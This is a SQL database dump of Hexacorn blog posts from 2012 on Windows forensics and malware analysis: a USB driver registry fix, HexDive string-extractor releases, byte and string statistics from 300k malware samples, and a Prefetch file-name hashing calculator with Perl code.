Registry under HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Enum\\USB\\ is prohibited for normal users, so you have to run the Regedit as SYSTEM.\nThe usual psexec -i -s regedit.exe worked like a charm and I navigated to the HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Enum\\USB\\VID_1058&PID_1140 key.\nNext, I manually copied the missing values from 1130 to 1140 (“Class”=”USB” and “Driver”=”{36fc9e60-c465-11cf-8056-444553540000}\\\\0103”) and modified the value of “ConfigFlags”=dword:00000400 to “ConfigFlags”=dword:00000000 (this removes annoying ‘driver not found’ popups) and then restarted the system.\nEt voila. Problem gone.\nFinal settings as shown below:\n\nNote: if you have a similar problem, make sure that you UNDERSTAND what you are doing before you even attempt to fix it yourself. Editing Registry is not as risky as everyone makes you believe, but if you screw it up, it is your fault only and don’t blame me if you need to rebuild your system. You have been warned \nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2012/07/06/my-book-1140-missing-drivers-a-k-a-western-digital-incompatible-brothers-situation/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (356, 'Permanent Link to HexDive 0.3', 'Hexacorn', 'July 5, 2012 ', 'New version comes with lots of fixes and updates.\nNew stuff includes:\n\nlots of new malware-specific APIs (I manually walked through thousands of them so over 1600+ APIs commonly used by malware is now being picked up)\nbanking URLs (all stuff from web injects from Zeus/SpyEye etc.)\ndomain names commonly changed via hosts file (anti-* routine to block security software, etc.)\nminor fixes to existing strings (simple mistakes I spotted)\nlarge files are now supported; it has been implemented since the beginning, but I have not tested it yet; if you come across issues, please let me know\nextra option to avoid showing copyright banner (same as in SysInternals tools /q or -q)\nbetter options handling (a’la Linux) so you can now specify -qfa instead of -q -f -a\n\nWhat’s coming: Currently toying around with porting the code to yasm so elf32 version precompiled for Linux Ubuntu may appear soon \nYou can download current version of HexDive here.\nIf your .exe download is blocked, you can try a zip file.\nNote:\nIf you find HexDive is missing strings, please let me know and I will add them. At some stage I plan to release all of the strings for free, but before I do it I want to ensure they are at least classified to some extent. Yes, I will do the dirty job  just let me know what is missing. If you have some features you would like to see, please let me know as well. And if you find any bugs, please also let me know.\nThanks for trying and don’t forget to check our other tools!\nShare this :)', 'HexDive, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/07/05/hexdive-0-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (357, 'Permanent Link to Random stats from 300k malicious samples – Entry Points', 'Hexacorn', 'July 4, 2012 ', 'Another stats from the sampleset – this time the most common entry points. One can generate a histogram of all Entry points for all executables on the whole system and potentially discover LFO (Least Frequency Occurrence) anomalies. This is not that straightforward though – even system32 directory gives lots of variety (see at the bottom): while most OS files are generated by the same compiler, system32 directory often holds many extra clean .exes that are accumulated over some time and give funny results (thanks to java/installers/and lots of other ‘goodness’ offered by badly written apps).\n55 and 8B EC are very common since they are an equivalent of\n  55      push ebp\r\n\r\nand\n  8B EC   mov ebp, esp\nIf the entry point does NOT start with any of these (look at 1-bytes only, remember the sampleset is biased), high chances it is a polymorphic / packed sample:\nStats for first 1,2,3,4,5,6 bytes below:\n 139672 55 <-- push ebp\r\n  33107 68 <-- push xx\r\n  14183 4D <-- MZ header\r\n  13208 E8 <-- call\r\n  12936 60 <-- pushad\r\n  10048 6A <-- push xx\r\n   5376 83 <-- various (e.g. cmp xx,yy)\r\n   5363 E9 <-- long jump\r\n   5222 EB <-- short jump\r\n   4962 8B <-- mov xx,yy\r\n\r\n 133124 55 8B <-- home work :)\r\n  14173 4D 5A\r\n   5037 60 E8\r\n   4505 6A 60\r\n   3870 55 89\r\n   3145 83 7C\r\n   3140 81 EC\r\n   2377 6A 00\r\n   1992 8B FF\r\n   1826 64 A1\r\n\r\n 132898 55 8B EC\r\n   7731 4D 5A 90\r\n   5786 4D 5A 50\r\n   4492 6A 60 68\r\n   3842 55 89 E5\r\n   3191 60 E8 00\r\n   3145 83 7C 24\r\n   1821 81 EC 80\r\n   1770 64 A1 00\r\n   1584 8B FF 55\r\n\r\n  53290 55 8B EC 83\r\n  35846 55 8B EC 6A\r\n  17214 55 8B EC 53\r\n  12931 55 8B EC B9\r\n   7712 4D 5A 90 00\r\n   6536 55 8B EC 81\r\n   5778 4D 5A 50 00\r\n   3190 60 E8 00 00\r\n   3137 83 7C 24 08\r\n   2853 55 89 E5 83\r\n\r\n  45104 55 8B EC 83 C4\r\n  35729 55 8B EC 6A FF\r\n  14775 55 8B EC 53 8B\r\n   7711 4D 5A 90 00 03\r\n   6638 55 8B EC 83 EC\r\n   5775 4D 5A 50 00 02\r\n   5258 55 8B EC 81 EC\r\n   3190 60 E8 00 00 00\r\n   3131 83 7C 24 08 01\r\n   2801 55 89 E5 83 EC\r\n\r\n  35498 55 8B EC 6A FF 68\r\n  22712 55 8B EC 83 C4 F0\r\n  14775 55 8B EC 53 8B 5D\r\n   7711 4D 5A 90 00 03 00\r\n   6959 55 8B EC 83 C4 C4\r\n   5775 4D 5A 50 00 02 00\r\n   3497 55 8B EC 83 C4 F4\r\n   3190 60 E8 00 00 00 00\r\n   3080 83 7C 24 08 01 75\r\n   2152 55 8B EC 83 C4 B4\nWhen I say the sampleset is biased, I mean it \nRrunning stats over executables within system32 directory, I got the following stats:\n  1461 8B <-- mov xx,yy\r\n   361 E8 <-- this is CALL\r\n   329 4D <-- MZ header (not \'real\' executable PE files)\r\n    44 55 <-- push ebp = much lower value as for 300K malware sampleset\r\n    32 83 <-- various (e.g. cmp xx,yy)\r\n    23 53 <-- push ebx\r\n    15 6A <-- push xx\r\n    11 FF <-- various (can be CALL)\r\n     2 E9 <-- long jump\r\n     1 EB <-- short jump\nand for 3 bytes:\n  1447 8B FF 55 <-- mov edi, edi / push ebp\r\n   329 4D 5A 90 <-- MZ header\r\n    33 55 8B EC <-- push ebp / mov ebp, esp\r\n    31 83 7C 24\r\n    14 53 55 56\r\n    11 8B 44 24\r\n    10 55 89 E5\r\n     9 E8 0A 00\r\n     8 E8 DA 02\r\n     8 6A 0C 68\nIf you want to quickly convert between bytes and the opcodes, you can use RTA.\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/07/04/random-stats-from-300k-malicious-samples-entry-points/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (358, 'Permanent Link to Forensic Riddle #12', 'Hexacorn', 'July 4, 2012 ', 'Most Windows APIs accepting strings as parameters are described on MSDN as FooBar and if they support ANSI/Unicode versions they refer to FooBarA, FooBarW e.g. CreateFile points to CreateFileA for ANSI and CreateFileW for Unicode (Wide).\nAre there any functions out there that do not follow this pattern, or slightly derive from it or perhaps extend it?\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/07/04/forensic-riddle-12/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (359, 'Permanent Link to Random stats from 300k malicious samples – Borland Libraries', 'Hexacorn', 'July 2, 2012 ', 'Quick & dirty script for pulling info out of the Borland samples helped to provide the following statistics for libraries being used by malware:\n  29458 SysInit\r\n  29068 System\r\n  28330 Windows\r\n  24572 Types\r\n  20368 Messages\r\n  17403 ActiveX\r\n  16312 SysUtils\r\n  15845 SysConst\r\n  15516 ShellAPI\r\n  14179 WinInet\r\n  13267 UrlMon\r\n  12689 Classes\r\n  12594 TypInfo\r\n  11574 Variants\r\n  11574 VarUtils\r\n  10892 WinSock\r\n  10836 Consts\r\n  10801 Registry\r\n  10745 RTLConsts\r\n  10704 ShlObj\r\n  10704 RegStr\r\n  10662 IniFiles\r\n  10515 Graphics\r\n  10358 Imm\r\n  10273 CommDlg\r\n  10256 Math\r\n  10037 WinSpool\r\n  10033 Forms\r\n  10032 Controls\r\n  10031 Printers\r\n  10031 Menus\r\n  10025 StdCtrls\r\n  10007 ExtCtrls\r\n   9933 Dlgs\r\n   9907 Dialogs\r\n   9704 Clipbrd\r\n   9647 CommCtrl\r\n   9632 ImgList\r\n   9632 FlatSB\r\n   9631 StdActns\r\n   9630 ActnList\r\n   9626 MultiMon\r\n   9344 Contnrs\r\n   8858 SyncObjs\r\n   8799 StrUtils\r\n   8751 RichEdit\r\n   8739 TlHelp32\r\n   8441 Buttons\r\n   8376 HelpIntfs\r\n   8090 ComCtrls\r\n   8086 ToolWin\r\n   8086 ComStrs\r\n   7792 WinHelpViewer\r\n   7276 Mapi\r\n   7261 ListActns\r\n   7257 ExtDlgs\r\n   7165 ExtActns\r\n   7074 Themes\r\n   7071 UxTheme\r\n   6270\r\n   5086 WinSvc\r\n   5063 IdResourceStrings\r\n   5063 IdException\r\n   5061 IdGlobal\r\n   5043 IdStackConsts\r\n   5043 IdStack\r\n   5042 IdBaseComponent\r\n   5028 IdAntiFreezeBase\r\n   5013 IdComponent\r\n   5001 IdSocketHandle\r\n   4964 IdURI\r\n   4898 IdTCPClient\r\n   4871 IdIntercept\r\n   4870 IdTCPConnection\r\n   4866 IdSocks\r\n   4783 IdStackWindows\r\n   4666 IdAssignedNumbers\r\n   4648 IdStream\r\n   4645 IdIOHandler\r\n   4644 IdIOHandlerSocket\r\n   4642 IdWinSock2\r\n   4392 MMSystem\r\n   4364 jpeg\r\n   4222 IdTCPStream\r\n   4155 IdRFCReply\r\n   4103 Unit1\r\n   3997 ComObj\r\n   3931 ComConst\r\n   3868 JConsts\r\n   3177 ScktComp\r\n   3092 IdCoder\r\n   3071 IdHeaderList\r\n   2906 IdCoder3to4\r\n   2903 IdCoderMIME\r\n   2880 Reg\r\n   2706 Project1\r\n   2679 Main\r\n   2641 IdStrings\r\n   2619 ImageHlp\r\n   2509 WinSvcEx\r\n\r\n\r\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/07/02/random-stats-from-300k-malicious-samples-borland-libraries/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (360, 'Permanent Link to Random stats from 300k malicious samples', 'Hexacorn', 'June 30, 2012 ', 'Playing around with strings extracted from 300K unique samples gave me a top 100 strings (as usual with statistics, don’t trust it too much as my sampleset is obviously biased)\n-in any case,  as you can see, code snippets (‘SVWU’), Borland strings and a few DLL/API names are highly prevalent:\n4521498 SVWU\r\n4008104 Left\r\n3858393 Width\r\n3849138 Height\r\n3651737 SVW3\r\n34282840 ZYYd\r\n2631375 QSVW\r\n1599950 OnClick\r\n1494950 TImage\r\n1470032 ParentFont\r\n1446438 ffffff\r\n1445277 TabOrder\r\n1418101 Font.Color\r\n1418071 Font.Style\r\n1418037 Font.Name\r\n1417970 Font.Height\r\n1416432 Font.Charset\r\n1209103 Z]_^[\r\n1208133 TObject\r\n1110345 SVWUQ\r\n1105144 Sender\r\n1102700 Cursor\r\n1093772 crHandPoint\r\n 975848 SVWQ\r\n 965275 Integer\r\n 913541 Caption\r\n 879263 BorderStyle\r\n 863747 ANSI_CHARSET\r\n 863173 Z_^[\r\n 845681 MaxLength\r\n 838228 TEdit\r\n 830785 clWindowText\r\n 829954 bsNone\r\n 820032 TLabel\r\n 701264 Color\r\n 692145 fsBold\r\n 685461 AutoSize\r\n 682814 OnChange\r\n 637873 Self\r\n 636857 YZ]_^[\r\n 629787 YZ^[\r\n 588869 Transparent\r\n 586796 Boolean\r\n 584700 DEFAULT_CHARSET\r\n 561879 Verdana\r\n 536738 fffffffff\r\n 516176 Controls\r\n 503455 MS Sans Serif\r\n 494892 Graphics\r\n 491681 OnKeyPress\r\n 476489 YZ_^[\r\n 475843 kernel32.dll\r\n 463060 Classes\r\n 443913 Forms\r\n 392601 Visible\r\n 379947 clBlack\r\n 349269 ffffffffffff\r\n 345758 GetProcAddress\r\n 341988 PasswordChar\r\n 323528 bvNone\r\n 320939 GetModuleHandleA\r\n 303360 ParentColor\r\n 301265 OnMouseDown\r\n 299551 clWhite\r\n 295778 Y_^[\r\n 294468 Picture.Data\r\n 288858 JFIF\r\n 287837 BevelOuter\r\n 287467 BevelKind\r\n 287029 LoadLibraryA\r\n 278017 SUVW\r\n 272626 bkFlat\r\n 269891 GWgw\r\n 260838 QQQQSV\r\n 254750 SSSSS\r\n 252854 user32.dll\r\n 249821 ExitProcess\r\n 244095 CloseHandle\r\n 243855 WriteFile\r\n 243140 GetModuleFileNameA\r\n 239566 VVVVV\r\n 236286 rdf:Description>\r\n 231692 Enabled\r\n 231218 Menus\r\n 229567 XYZ\r\n 225944 RegCloseKey\r\n 225145 UUUUUU\r\n 223352 Alignment\r\n 220329 rdf:Description rdf:about=\"\"\r\n 219210 MessageBoxA\r\n 216162 String\r\n 215643 fffffffffffffff\r\n 213682 CreateFileA\r\n 211018 Sleep\r\n 210632 advapi32.dll\r\n 209798 VirtualAlloc\r\n 207239 Arial\r\n 206138 KERNEL32.DLL\r\n 202769 RegQueryValueExA\r\n 200100 Ctl3D\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/06/30/random-stats-from-300k-malicious-samples/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (361, 'Permanent Link to HexDive 0.2', 'Hexacorn', 'June 21, 2012 ', 'I just released a new version of HexDive. Added really lots of new strings so it should be picking up more juice from malicious samples \nNew strings include:\n\npcap (winpcap related strings)\nlibraries\nmime types\ncharset encodings\nformatted strings patterns\nOS file names\nprotocols\nIPs\nUser agents\ninformation-stealing related keywords\nand more\n\nNote, at this stage HexDive doesn’t search for any regexes (e.g. URLs/emails/etc ), but it is in the making, so stay tuned.\nYou can download it here.\nIf your .exe download is blocked, you can try a zip file.\nNote1:\nIf you find HexDive is missing strings, please let me know and I will add them. At some stage I plan to release all of the strings ofr free, but before I do it I want to ensure they are at least classified to some extent. Yes, I will do the dirty job  just let me know what is missing. Thanks!\nNote2:\nhdive can be ran on static samples (unpacked) and process memory dumps as well; for the benchmark purposes – an example when it is ran on a 27MB file which is a process memory dump of a simple trojan takes 12-13 seconds.\nTimeThis :  Command Line :  hdive malware.DMP\nTimeThis :    Start Time :  Fri Jun 22 20:24:02 2012\nTimeThis :  Command Line :  hdive malware.DMP\nTimeThis :    Start Time :  Fri Jun 22 20:24:02 2012\nTimeThis :      End Time :  Fri Jun 22 20:24:15 2012\nTimeThis :  Elapsed Time :  00:00:12.683\nShare this :)', 'HexDive, Malware Analysis', 'http://www.hexacorn.com/blog/2012/06/21/hexdive-0-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (362, 'Permanent Link to Prefetch Hash Calculator + a hash lookup table xp/vista/w7/w2k3/w2k8', 'Hexacorn', 'June 13, 2012 ', 'Update 4\n\nIn July 2013 I added a little bit about /Prefetch:xxx command line argument. Read it here.\nUpdate 3\nIn October 2012 I added a small addendum here describing how the UNC paths are being processed by the algorithm.\nUpdate 2\nI previously wrote that “Windows 7 introduces another quirky change – device path now starts from volume2 (if anyone knows why, please let me know).“. One good fellow forensic investigator (he asked to remain anonymous) came back to me with an explanation – it’s a 100MB reserved partition that occupies volume number 1 on Windows 7.\nIn most cases, results of prefetch hash calculator tool will be valid for Windows 7 as most of W7 users have this hidden partition present. Now, if someone intentionally removes the hidden partition and uses volume 1 as C:, the resulting hashes will be incorrect.\nThe short fix is to quickly modify the script to count volumes from C-B, instead of C-A (lines 111 and 137).\nThe issue between mapping the logical drives (DOS names) and physical devices is a bit of an issue and a next version of the script will be a bit smarter in this aspect. Stay tuned.\nUpdate\nAdded Windows 8 Customer Preview 32-bit (inline). Will update script later.\nOld Post\nI guess at this moment of time everyone is familiar with a content of \\windows\\Prefetch folder as well as the value it has  for a forensic investigation or IR/malware analysis. There are multiple scripts available out there that can parse the content of Prefetch files, and even running simple strings on the .pf files are good enough to point us into a place where the malware or its files are stored. Of course, one has to also remember that Prefetch analysis can be fooled by a couple of tricks eg. PrefetchADS as well as a 10+ seconds delay before opening any file trick.\nThis post is about the actual hashing algorithm used by Prefetch files.\nHistory\nIt has been already discussed previously here, here, and here, but I always felt there is more to the story, so I decided to provide some more information about what’s going on under the hood… and update the knowledge base with algorithms for newer versions of Windows.\nAlgorithms covered in this post\n\nWindows XP 32-bit\nWindows Vista 32-bit\nWindows 7 32-bit\nWindows 7 64-bit\nWindows 8 32-bit (Customer Preview)\nWindows Server 2003 32-bit\nWindows Server 2008 32-bit\nWindows Server 2008 64-bit\n\nAs far as I can tell:\n\nThe presented algorithms most likely work for all the service packs, new releases (one exception is 2008 R2 – see below).\nPrefetching is by default disabled on Servers  (2003 and 2008), but can be enabled.\nPrefetching on 2008 R2 is disabled and doesn’t seem to be available for enabling (prefetch calculation code is still present; relevant discussion here).\n\nPrefetch file naming algorithm vs. hashing function\nThere is fundamentally one single Prefetch hashing algorithm used by various Windows versions, except it has been slightly modified over the time. I must emphasize here a distinction between a Prefetch file naming algorithm and a hashing function (I chose these names on my own, but I think they are quite relevant):\n\nPrefetch file naming algorithm – produces the string e.g. RUNDLL32.EXE-35A2A03F.pf\nHashing function – produces a hash or multiple hashes that are building the final part of a Prefetch file name e.g. 35A2A03F\n\nThe reason why I need to emphasize it will become clearer later.\nHashing functions\nThere are 3 hashing functions  used by variations of Prefetch file naming algorithm that I am aware of:\n\nWindows XP 32-bit/Windows Server 2003\nWindows Vista 32-bit\nWindows 7/Windows Server 2008/Windows 8 32-bit\n\nThe code implementing all of them as well as for Prefetch file naming algorithm is available in a script attached to this post.\nPrefetch file naming algorithm – analysis 1/2\nWhen you run an application for an example say…  notepad.exe, the following things happen:\n\nThe full path for the file is determined e.g. c:\\windows\\notepad.exe.\nThe path isconverted to Unicode string.\nThe full path is converted from to a device path e.g. \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\NOTEPAD.EXE.\nNow, the hashing function is applied to the buffer.\nThen the Prefetch file name is determined as a filename-hash e.g. CALC.EXE-02CD573A.pf.\n\nThe hashing function is implemented by a function CcPfHashValue and its original code has been already provided (for XP) on the blog I mentioned earlier. Newer versions of Windows store hashing functions code either inline or inside PfCalculateProcessHash/PfSnScanCommandLine functions.\nLooking at CcPfHashValue in windbg we can see the following:\n\nThe assembly code converted to perl looks as follows:\nsub hash_xp\r\n{\r\n  my $devpath_u = shift;\r\n  my $hash = 0;\r\n  for (my $i=0; $i<length($devpath_u); $i++)\r\n  {\r\n      my $char = ord(substr($devpath_u,$i,1));\r\n      $hash = ( ($hash * 37) + $char ) % 4294967296;\r\n      #print STDERR sprintf(\"%08lX\",$hash).\' \'.substr($devpath_u,$i,1).\"\\n\";\r\n  }\r\n  $hash = ($hash * 314159269) % 4294967296;\r\n\r\n  $hash = 0x100000000-$hash if ($hash>0x80000000);\r\n  $hash = (abs($hash) % 1000000007) % 4294967296;\r\n  return $hash;\r\n}\nNow, knowing the hashing algorithm, it is tempting to assume that you could do this:\nfor each .exe file on the system\r\n   find its full path\r\n      apply the algorithm\r\n       build a lookup table of all possible \'full path to .exe\' & \'hash\' pairs\r\n           use it as a reference while analyzing the content\r\n           of the actual Prefetch folder.\nWell, indeed you can do it and the script provided as an attachment to this article is doing exactly this. It generates hashes for known .exe files extracted from various Windows systems + also for known rundll32.exe calls (If you find any missing entry, please let me know).\nThe script also accepts file names as a command line argument which can be used to instantly calculate the hash for a file of your choice and it can calculates the hash for XP (32-bit), Vista (32-bit) and Windows 7 (32- and 64-bit) as well as for 32-bit versions of Windows Server 2003 and 2008.\nSo far so good. We can now build a lookup table that we can then use to associate known Prefetch hashes with the actual full paths.\nBut hold on, what about the hashes for programs that are executed with a command line arguments?\nTurns out that for a typical application without a command line argument hashing function is applied only once and only to the the path; the command line arguments are simply ignored. And using command line when launching the applications doesn’t change a thing. One can run e.g. Notepad as notepad.exe and also with a command line argument e.g. notepad.exe 1.txt. The hash will remain the same.\nPrefetch file naming algorithm – analysis 2/2\nI mentioned ‘typical’. This is where the things get  a bit ugly. There are two exceptions when hash calculation becomes a bit more complex. It has to do with the two following cases:\n\nthe application ran is a so-called hosting application e.g. rundll32.exe, mmc.exe, and newer versions of Windows systems also include dllhost.exe and svchost.exe\n\nthere is a command line /Prefetch used (I skip this bit in this post)\n\nIn these cases, the Prefetch file name no longer relies on a device .exe path only. It does take it into account of course, but it also includes a command line used to launch an application itself and/or /Prefetch command line argument if it exists.\nFor example, running a command:\nrundll32.exe shell32.dll,Control_RunDLL main.cpl @0\ngives us a Mouse Properties dialog box:\n\nThe following happen when you run it:\n\nThe full path for the file is determined e.g. c:\\windows\\system32\\rundll32.exe\nThe Path is stored/converted to Unicode string\nThe full path is converted from to a device path e.g. \\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\RUNDLL32.EXE\nNow, the hashing function is applied for the first time (I refer to it below as hash1) and is calculated on the path like this:\n\n\n\nThen comes the second part: the command line\nThe second hash (I refer to it below as hash2) is calculated on a case-sensitive path+command line combo and it includes quotation marks (XP) e.g.:\n\n\n\nOnce the 2 hashes are calculated, they are added together.\nSo, the actual hash string used in a Prefetch file name is a sum of hash1+hash2; this is why I made the distinction between the Prefetch file naming algorithm and hashing function at the very beginning of the article – they are 2 different things; one relies on another to build a final file name string\nIn this particular case, the Prefetch file name is RUNDLL32.EXE-40E8EB31.pf (XP-32bit only).\n\nOkay, so the problem with anything that runs via rundll32.exe (or other hosting application) is that the path is case sensitive and any change to it generates a new Prefetch file name \nIndeed, as an experiment, you can try running the following commands (run on XP-32bit):\n\nrundll32.exe shell32.dll,Control_RunDLL main.cpl @0\n\nproduces RUNDLL32.EXE-40E8EB31.pf\n\n\nrundll32.exe Shell32.dll,Control_RunDLL main.cpl @0\n\nproduces RUNDLL32.EXE-3EEC4634.pf\n\n\nrundll32.exe sHell32.dll,Control_RunDLL main.cpl @0\n\nproduces RUNDLL32.EXE-48FA8C58.pf\n\n\n\nThe second problem comes from the path of the actual rundll32.exe. The hashing function is applied twice and it walks through a buffer storing device path to rundll32.exe + command line, and this one is case-sensitive. So, any change to the path generates a different hash1; that is,\n\nc:\\WINDOWS\nc:\\wINDOWS\nc:\\windows\n\nwill produce different hashes \nLast, but not least, even a number of spaces between the rundll32.exe path and its command line makes a difference as well e.g.\n\nrundll32.exe shell32.dll,Control_RunDLL main.cpl @0\nrundll32.exe  shell32.dll,Control_RunDLL main.cpl @0\nrundll32.exe   shell32.dll,Control_RunDLL main.cpl @0\n\nwill also produce different hashes (hash2)!\nWhile it is possible to build some sort of rainbow tables for all such possible Prefetch path&command line combinations, it’s time consuming and most of the time not worth it.\nThere are still good news though. And I already mentioned it earlier.  Instead of building large lookup tables, it is easier to find all .exe file names + all references to rundll32.exe 9and othe rhosting applications listed earlier) within the evidence (e.g. extract strings from a full image+from memory+malware samples+registry), and calculate the hashes of the exact path name or path+command line as present in evidence. We will end up with a small list of pairs:\n\nPrefetch file name\nfull path\n\nthat can be used for lookups for each particular forensic case.\nThe Prefetching file naming algorithms on various systems\nAs you now know, a simple change in a path, an extra space, or a case-sensitivity of a letter changes the final name of a Prefetch file. Sadly, this is partially the reason why hash calculated for one system doesn’t work for another.\nEach version of the Windows OS uses a different prefetching file naming algorithm\n\nWindows XP 32-bit\n\nsum of hash_xp (on devicename and c: = volume1)+ hash_xp(quoted path+command line)\n\nWindows Vista 32-bit\n\nsum of hash_vista (on devicename and c: = volume1)+ hash_vista(quoted path+command line)\n\nWindows 7 32-bit\n\nsum of hash_w7 (on devicename and c: = volume2 )+ hash_w7(quoted path+command line)\n\nWindows 7 64-bit\n\nsum of hash_w7 (on devicename and c: = volume2 )+ hash_w7(unquoted path+command line prefixed with extra blank character\n\nWindows 8 32-bit\n\nsum of hash_w7 (on devicename and c: = volume2 )+ hash_w7(unquoted path+command line prefixed with extra blank character\n\nWindows Server 2003 32-bit\n\nsum of hash_xp (on devicename and c: = volume1 )+ hash_xp(unquoted path+command line)\n\nWindows Server 2008 32-bit\n\nsum of hash_w7 (on devicename and c: = volume1 )+ hash_w7(unquoted path+command line prefixed with extra blank character)\nExample for\nC:\\WINDOWS\\system32\\rundll32.exe ” shell32.dll,Control_RunDLL hdwwiz.cpl”\nlooks as follows:\n\n\nXP    (32-bit)  RUNDLL32.EXE-213BB9F5.pf\n\n\nVista (32-bit)  RUNDLL32.EXE-9E75AB16.pf\n\n\nW7    (32-bit)  RUNDLL32.EXE-CD32988B.pf\n\n\n2003  (32-bit)  RUNDLL32.EXE-36767DBD.pf\n\n\n2008  (32-bit)  RUNDLL32.EXE-06E5B2CA.pf\n\n\nW7    (64-bit)  RUNDLL32.EXE-35A2A03F.pf\n\n\nW8 CP (32-bit)  RUNDLL32.EXE-35A2A03F.pf\n\n\nThe script and a simple hash lookup table\nIt is a very simple algorithm, yet the differences and subtleties make it very confusing.\nAs mentioned before, the script attached to this post will calculate all the known hashes based on command line arguments. And if there are no command line arguments, it will generate a lookup table for a lot of known  file names + known rundll32.exe combinations (e.g. these launching various system properties applets) that may be immediately used against evidence. At any time, you can also provide your own file list.\nTo run:\n\nprefhashcalc.pl <path> ” <command line>”\n\nOR\n\nprefhashcalc.pl -f <filelist>\n\nOR\n\nprefhashcalc.pl > <prefetch_lookup_table file>\n\nExamples:\n\nprefhashcalc.pl c:\\windows\\notepad.exe\nprefhashcalc.pl c:\\windows\\system32\\notepad.exe\nprefhashcalc.pl C:\\WINDOWS\\system32\\rundll32.exe ” shell32.dll,Control_RunDLL main.cpl @0″\nprefhashcalc.pl C:\\WINDOWS\\system32\\rundll32.exe ”  shell32.dll,Control_RunDLL main.cpl @0″\nprefhashcalc.pl > lookup_table_of_all_known.txt\nprefhashcalc.pl -f myfilelist.txt > my_lookup_tablet.txt\n\nNote: \nfor hosting applications e.g. rundll32.exe you need to prefix the actual command line  argument for a hosting application  with a blank character or more of them as they are directly concatenated before passed to hashing function, using arguments like this:\n\nC:\\WINDOWS\\system32\\rundll32.exe “shell32.dll,Control_RunDLL main.cpl @0″\n\nwould make the function calculate hash for\n\nC:\\WINDOWS\\system32\\rundll32.exeshell32.dll,Control_RunDLL main.cpl @0\n\nwhich is incorrect.\nScript detects this situation and prints the error message. You can see an example use below:\n\nRunning:\n\nprefhashcalc.pl > lookup_table_of_all_known.txt\n\nproduces a lookup table that you can grep or import to Excel and use VLOOKUP function to search for the known Prefetch file name.\nThe lookup is generated using the following algorithm:\nfor each entry on a list attached to the script\n      for each letter from c: to f:\n           for each supported operating system\n               calculate hash and print lookup entries to the output\r\n                 (including lower/upper case)\n\nDownload\nYou can download the script here.\nAnd the pregenerated lookup table for Prefetch hashes file is here.\nFinal words\nFew things come to mind that I have not looked at but may be worth checking:\n\nhash collisions – there must be paths that produce the same Prefetch file names.\n/Prefetch command line argument.\nPrefetch settings under the following key allow for Prefetch setting manipulation (even the location of Prefetch files – this could be an interesting anti-forensics technique)\n\n       HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\\r\n          Control\\Session Manager\\Memory Management\\\r\n              PrefetchParameters\nThanks for reading and testing the script; note that it is a first version and may contain bugs. If you spot anything wrong, please let me know. Thanks in advance.\nShare this :)', 'Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2012/06/13/prefetch-hash-calculator-a-hash-lookup-table-xpvistaw7w2k3w2k8/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (363, 'Permanent Link to HexDive – Intelligent String Extractor', 'Hexacorn', 'June 7, 2012 ', 'In my last two posts, I mentioned I am working on a new tool. The tool’s idea is to extract a subset of all strings from a given file/sample in order to reduce time needed for finding ‘juicy’ stuff – meaning: any string that can be associated with a) malware b) any other category;\nThis should help in a quick assessment of a file w/o going through lots of noise coming from typical strings tools (they ‘see’ a few bytes looking like ASCII/Unicode and assume it is a string).\nHopefully the tool will help in batch analysis (on unpacked files, or memory dumps).\nThis is a first release so expect bugs; for various reasons I stripped part of the database as I am still working on full classification of all keywords (this is a one hell of work).\nBy default, the tool works like an enhanced HAPI. It extracts interesting strings to the output, but includes not only APIs, but also other stuff .\nTo see a full categorization and also include _all_ recognized strings use options as described and shown on a few screenshots below.\nI hope it works for you and will be useful. If you find any bugs, I will really appreciate if you let me know. Also, if you see some strings being missed, please be patient and wait for next release (and ideally drop me an email listing all the stuff hdive missed; I will add it in a next release).\nThanks for trying!\nUpdate:\nelhoim  is asking about speed and programing language; it’s x86 assembly, for small files it’s a blitz; for larger e.g. 30MB, there is a short moment of ‘thinking’, but it’s reasonable. Didn’t test on a large collection, but for this I would need to add a processing for directories to speed it up (I have it on todo list). IT searches for over 100K unique keywords at the moment (including both ANSI, Unicode, some case sensitive).\nUpdate #2\nCheck this nice post about MBR Analysis on http://www.sysforensics.org/2012/06/mbr-malware-analysis.html to see what difference HexDive makes in string analysis.\n \nTo Run:\n--------------------------------------------------------------\r\n  hexdive v0.1 (c) Hexacorn 2012. All rights reserved.\r\n  Visit us at http://www.hexacorn.com\r\n--------------------------------------------------------------\r\nUsage:\r\n   hdive [-/]<options> <filename>\r\n      where options are:\r\n      - a - show all strings (only malware-related are shown by default)\r\n      - f - show |-separated classification (default output are raw strings)\r\nExample:\r\n   hdive -a malware.exe\r\n   hdive -f malware.exe\r\n   hdive -a -f malware.exe\r\n--------------------------------------------------------------\r\n\r\nGimme a file name!\n \nExamples of use:\nhdive c:\\Windows\\System32\\notepad.exe\nand\nhdive -f c:\\Windows\\System32\\notepad.exe\n \n\nhdive -a c:\\Windows\\System32\\notepad.exe\n\nhdive -f c:\\Windows\\System32\\notepad.exe\n\nYou can download it here.\nShare this :)', 'HexDive, Malware Analysis, Software Releases', 